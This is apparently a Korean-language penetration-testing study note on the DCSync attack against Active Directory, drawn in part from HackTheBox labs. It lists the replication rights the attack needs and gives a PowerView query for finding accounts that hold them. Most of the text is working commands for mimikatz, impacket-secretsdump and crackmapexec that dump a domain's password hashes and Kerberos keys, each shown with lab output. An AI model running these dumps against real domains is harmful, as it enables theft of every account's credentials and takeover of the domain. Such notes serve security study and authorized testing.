사용자에게 Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes in Filtered Set 권한이 있어야 함.

[+] hackthebox 에서 찾은 결과:

PowerView.ps1 의 다음 커맨드로 찾았을 때, ObjectAceType이 DS-Replication-Get_changes-All 권한이 있으면 가능
```powershell
powershell Get-ObjectACL "DC=htb,DC=local" -ResolveGUIDs | ? {
($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match
'Replication-Get') }
```

디폴트로 **Domain Admins, Enterprise Admins, Administrators** 그룹의 구성원에게 이러한 권한이 할당 됨.

DC Sync 는
**→ mimikatz (win)**
**→ impacket-secretsdump (kali)**
**→ crackmapexec (kali)**
로 할 수 있다.

### mimikatz
```powershell
# 프리빌리지 debug 필요 x
lsadump::dcsync /user:corp\\Administrator
#...
#Credentials:
#  **Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e**
#...
```

### impacket-secretsdump
```powershell
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\\!"@192.168.50.70
#Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

#[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
#**[*] Using the DRSUAPI method to get NTDS.DIT secrets**
#dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
#[*] Kerberos keys grabbed
#dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
#dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
#dave:des-cbc-md5:1a329b4338bfa215
#[*] Cleaning up...

```

### crackmapexec
```powershell
└─# cme smb 192.168.40.150 -u administrator -p 'Password123!' --ntds                                                                                  
SMB         192.168.40.150  445    DC01             [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:choi.local) (signing:False) (SMBv1:
True)                                                                                                                                                 
SMB         192.168.40.150  445    DC01             [+] choi.local\\administrator:Password123! (Pwn3d!)                                         
SMB         192.168.40.150  445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...                    
SMB         192.168.40.150  445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         192.168.40.150  445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::          
SMB         192.168.40.150  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a8f31b642e60b362cc17588df4c5b1e2:::     
SMB         192.168.40.150  445    DC01             choi.local\\low:1601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::    
SMB         192.168.40.150  445    DC01             sqladmin:1603:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::             
SMB         192.168.40.150  445    DC01             choi.local\\sqldude:1604:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         192.168.40.150  445    DC01             choi.local\\linuxadmin:1605:aad3b435b51404eeaad3b435b51404ee:f7381d09866c0d678b836bf38b37122a:::   
SMB         192.168.40.150  445    DC01             choi.local\\edward:1608:aad3b435b51404eeaad3b435b51404ee:2d769326bbe2798417b8fb6091f3857e:::
SMB         192.168.40.150  445    DC01             choi.local\\da:1618:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

[ . . . ]
```

